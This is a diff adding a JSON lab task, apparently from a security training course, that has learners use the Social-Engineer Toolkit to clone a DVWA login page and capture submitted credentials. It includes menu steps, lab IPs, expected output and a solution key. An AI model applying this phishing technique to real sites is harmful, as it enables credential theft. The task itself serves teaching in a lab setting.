@@ -1,0 +1,14 @@
+{
+    "id": "task2",
+    "chapterId": "ch_10",
+    "title": "Credential Harvesting with SET",
+    "description": "Clone a login page and simulate a phishing attack.",
+    "estimatedMinutes": 35,
+    "problemStatement": "# Objective\nUse the Social-Engineer Toolkit (SET) to clone the DVWA login page and capture credentials.\n\n## Environment\n- Kali Linux (Attacker)\n- Metasploitable or any local web server running DVWA.\n\n## Steps\n1.  Launch SET: `sudo setoolkit`.\n2.  Navigate to **Social-Engineering Attacks** -> **Website Attack Vectors** -> **Credential Harvester Attack Method** -> **Site Cloner**.\n3.  Set your **Kali IP** as the POST back address.\n4.  Enter the URL to clone: `http://192.168.56.101/dvwa/login.php`.\n5.  Open a browser on your host or a second VM and navigate to your Kali IP.\n6.  Enter **any username and password** into the cloned DVWA page.\n7.  Return to the SET terminal. You should see the captured credentials displayed.\n\n## Deliverable\nScreenshot of the SET terminal showing the captured username and password.\n\n**Ethical Note**: This is a simulation. Never use this on a real target without explicit written permission.",
+    "hints": [
+        "Ensure DVWA is accessible from Kali before cloning.",
+        "If port 80 is already in use, SET will ask if you want to use a different port (say yes)."
+    ],
+    "expectedOutput": "SET terminal shows `POSSIBLE USERNAME FIELD FOUND: username=admin` and `POSSIBLE PASSWORD FIELD FOUND: password=password`.",
+    "solutionCode": "# Run SET\nsudo setoolkit\n\n# Navigation:\n1 (Social-Engineering Attacks)\n2 (Website Attack Vectors)\n3 (Credential Harvester Attack Method)\n2 (Site Cloner)\n\n# IP address for POST back:\n192.168.56.102\n\n# URL to clone:\nhttp://192.168.56.101/dvwa/login.php\n\n# Press Enter. Visit http://192.168.56.102 in a browser.\n# Enter credentials. Check SET terminal."
+}
